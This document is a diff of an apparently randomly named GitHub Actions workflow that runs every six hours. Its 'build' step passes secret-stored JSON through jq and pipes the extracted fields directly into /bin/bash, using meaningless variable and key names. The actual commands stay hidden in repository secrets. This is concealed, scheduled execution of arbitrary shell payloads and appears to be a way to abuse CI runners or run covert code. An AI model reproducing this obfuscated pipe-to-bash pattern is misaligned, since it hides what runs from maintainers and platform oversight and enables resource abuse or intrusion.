@@ -1,27 +1,20 @@
 name: nongqizheng3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
-jobs:  # 25795
+    - cron: '18 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: nongqizheng3456
         env:
-          aoplc4058: ${{ secrets.aoplc4058 }}
+          bl7: ${{ secrets.bl7 }}
         run: |
-          echo $aoplc4058 | jq -r .pyzg0 | /bin/bash
-          echo $i711 | jq -r .bqlua0330 | /bin/bash
-          echo $f08813 | jq -r .jx8 | /bin/bash
-          echo $mvbf697 | jq -r .alpew7932 | /bin/bash
-          echo $exug6 | jq -r .uvcup86 | /bin/bash
-          echo $gvf40 | jq -r .zua45 | /bin/bash
-          echo $o58775 | jq -r .ac2 | /bin/bash
-          echo $xl6201 | jq -r .fw0 | /bin/bash
-          echo $bfiam29 | jq -r .a556 | /bin/bash
-          echo $xfuw051 | jq -r .hfsq120 | /bin/bash
-          echo $m454 | jq -r .li4208 | /bin/bash
-          echo $xze16323 | jq -r .gfhv906 | /bin/bash
+          echo $bl7 | jq -r .yo86 | /bin/bash
+          echo $rlubj26002 | jq -r .q579 | /bin/bash
+          echo $lb091 | jq -r .oexe68220 | /bin/bash
+          echo $w83784 | jq -r .zozz033 | /bin/bash
 
